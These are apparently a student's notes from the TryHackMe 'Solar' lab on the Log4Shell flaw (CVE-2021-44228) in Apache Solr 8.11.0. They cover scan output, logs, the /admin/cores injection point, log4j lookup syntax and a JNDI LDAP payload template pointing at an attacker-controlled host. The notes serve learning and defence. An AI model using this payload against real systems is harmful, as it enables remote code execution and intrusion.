# Log4j Vulnerability - Solar (THM)

## Reconnaissance
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 (RSA)
|   256 b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 (ECDSA)
|_  256 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
8983/tcp open  http    Apache Solr
| http-title: Solr Admin
|_Requested resource was http://solar.thm:8983/solr/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Apache Solr running on port 8983
```bash
2021-12-13 03:43:31.642 INFO  (main) [   ] o.a.s.s.SolrDispatchFilter  ___      _       Welcome to Apache Solrâ„¢ version 8.11.0
2021-12-13 03:43:31.642 INFO  (main) [   ] o.a.s.s.SolrDispatchFilter / __| ___| |_ _   Starting in standalone mode on port 8983
2021-12-13 03:43:31.643 INFO  (main) [   ] o.a.s.s.SolrDispatchFilter \__ \/ _ \ | '_|  Install dir: /opt/solr
2021-12-13 03:43:31.644 INFO  (main) [   ] o.a.s.s.SolrDispatchFilter |___/\___/_|_|    Start time: 2021-12-13T03:43:31.644Z%

```
- The target is using solr 8.11.0 -> found in the logs
```bash
2021-12-13 03:48:49.734 INFO  (qtp1083962448-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0
QTime=0
2021-12-13 03:48:50.208 INFO  (qtp1083962448-23) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0
QTime=0
2021-12-13 03:48:50.702 INFO  (qtp1083962448-21) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0
QTime=0

```
- there's an endpoint /admin/cores 
- we can use params={} for providing our payload
- response from /solr/admin/cores
```json
{
  "responseHeader":{
    "status":0,
    "QTime":0},
  "initFailures":{},
  "status":{}
}
```
> The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact _executed_ just as it is entered into log files.
- Some examples of this syntax: 
	-   `**${sys:os.name}**`
	-   `**${sys:user.name}**`
	-   `**${log4j:configParentLocation}**`
	-   `**${ENV:PATH}**`
	-   `**${ENV:HOSTNAME}**`
	-   `**${java:version}**`
- General format of the payload 
```
`**${jndi:ldap://ATTACKERCONTROLLEDHOST}**`
```
- The log4j library invokes JNDI(Java Naming and Directory Interface) which is used to access external resources or references which are later used in the attack. 
- ldap:// is used to reach out to an attacker controller location (or endpoint) 

The log4j payload can be supplied in `User-Agent`, `X-Forwaded-For`, other customizable headers, input fields or any such place where user can input provide some input.
- In this machine, it's possible via tha params in HTTP GET request
